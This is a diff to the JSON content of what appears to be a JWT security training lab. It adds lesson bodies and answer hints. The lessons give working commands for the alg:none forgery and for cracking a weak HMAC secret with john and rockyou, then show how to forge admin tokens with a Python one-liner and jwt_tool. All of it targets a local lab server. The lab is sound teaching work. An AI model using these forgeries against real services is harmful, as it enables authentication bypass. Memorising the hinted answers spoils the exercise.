@@ -4,18 +4,42 @@
   "tasks": {
     "1": {
       "title": "JWT anatomy and the alg:none attack",
+      "body": "## The 3 parts of a JWT\n\n```text\neyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9 . SflKxwRJSMeKKF2QT4\n└─── header (alg) ──┘   └────── payload (claims) ──────────────┘   └─ signature ─┘\n```\n\nDecode each part (they are base64url):\n\n```bash\n# In the lab, copy your token from the main page and decode it:\necho 'eyJhbGciOiJIUzI1NiJ9' | base64 -d    # {\"alg\":\"HS256\"}\necho 'eyJ1c2VyIjoiZ3Vlc3Q... ' | base64 -d # {\"user\":\"guest\",\"role\":\"user\"}\n```\n\n## The alg:none attack\n\nA JWT's signature is verified ONLY if the algorithm requires it. If you change the header to\n`\"alg\":\"none\"`, many servers (wrongly) accept the token without verifying it:\n\n```bash\n# 1. Build the malicious header\nHEADER=$(echo -n '{\"alg\":\"none\"}' | base64 | tr -d '=' | tr '/+' '_-')\n\n# 2. Build the payload with role:admin\nPAYLOAD=$(echo -n '{\"user\":\"hacker\",\"role\":\"admin\",\"exp\":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')\n\n# 3. Unsigned token (note the empty trailing dot)\nTOKEN=\"${HEADER}.${PAYLOAD}.\"\n\n# 4. Send it\ncurl \"http://127.0.0.1:18094/login?token=${TOKEN}\"\n```\n\nThe response contains all 3 flags — the server accepted the unsigned token because\nthe header said `alg:none`.",
       "questions": {
-        "jwt-security-t01-q01": { "prompt": "How many parts does a JWT have separated by dots?" },
-        "jwt-security-t01-q02": { "prompt": "What JWT algorithm requires no signature?" },
-        "jwt-security-t01-q03": { "prompt": "Submit the flag obtained by using alg:none with role:admin." }
+        "jwt-security-t01-q01": {
+          "prompt": "How many parts does a JWT have separated by dots?",
+          "hint": "header.payload.signature"
+        },
+        "jwt-security-t01-q02": {
+          "prompt": "What JWT algorithm requires no signature?",
+          "hint": "none — literally 'no algorithm'."
+        },
+        "jwt-security-t01-q03": {
+          "prompt": "Submit the flag obtained by using alg:none with role:admin.",
+          "hint": "Decode your token, change alg to none and role to admin, remove the signature, send it to /login"
+        }
       }
     },
     "2": {
       "title": "Weak secret: crack and forge tokens",
+      "body": "## Cracking the secret\n\nThe `/crack` endpoint gives you a SHA256 hash of the secret:\n\n```bash\ncurl http://127.0.0.1:18094/crack\n# {\"hash\": \"e88040e7d0052...\", \"hint\": \"common phrase, rockyou top 1000\"}\n\n# Crack it with hashcat or john:\necho 'e88040e7d0052eeb5dcf0fd834e4835ff329b275e6a9889058e8d16c38da9514' > hash.txt\njohn --wordlist=rockyou.txt --format=raw-sha256 hash.txt\n# Result: jwt_secret\n```\n\n## Forging a signed token\n\nNow that you know the secret (`jwt_secret`), you can sign VALID tokens:\n\n```bash\n# With Python:\npython3 -c \"\nimport hmac, hashlib, base64, json\n\nsecret = 'jwt_secret'\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()\npayload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()\nsig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()\nprint(f'{header}.{payload}.{sig}')\n\"\n\n# Or with the jwt_tool utility:\npython3 jwt_tool.py <original_token> -S hs256 -pc role -pv admin -p Secret jwt_secret\n```\n\n## The comparison: a strong secret\n\nThe `/strong` endpoint uses a secret of 50+ random characters:\n\n```bash\ncurl http://127.0.0.1:18094/strong\n# Try cracking that hash — you won't manage it within the lifetime of the universe\n```\n\n**Lesson**: JWT secrets must be LONG (256+ bits) and random. A dictionary\nsecret turns your \"secure authentication\" into a worthless piece of paper.",
       "questions": {
-        "jwt-security-t02-q01": { "prompt": "What lab endpoint gives you the secret's hash for cracking?" },
-        "jwt-security-t02-q02": { "prompt": "What is the lab's weak secret?" },
-        "jwt-security-t02-q03": { "prompt": "Submit the flag obtained by forging a token with the cracked secret." }
+        "jwt-security-t02-q01": {
+          "prompt": "What lab endpoint gives you the secret's hash for cracking?",
+          "hint": "/crack"
+        },
+        "jwt-security-t02-q02": {
+          "prompt": "What is the lab's weak secret? (it is in the top 100 of rockyou.txt)",
+          "hint": "It's a common phrase about JWT... (jwt_secret)"
+        },
+        "jwt-security-t02-q03": {
+          "prompt": "Submit the flag obtained by forging a token with the cracked secret.",
+          "hint": "Once you know the secret is jwt_secret, sign your own HS256 token"
+        },
+        "jwt-security-t02-q04": {
+          "prompt": "The /login response to your forged token also includes flag_2, the reward for cracking the weak secret. Submit it.",
+          "hint": "Role premium or admin signed with jwt_secret is enough; look for the flag_2 key in the JSON."
+        }
       }
     }
   }
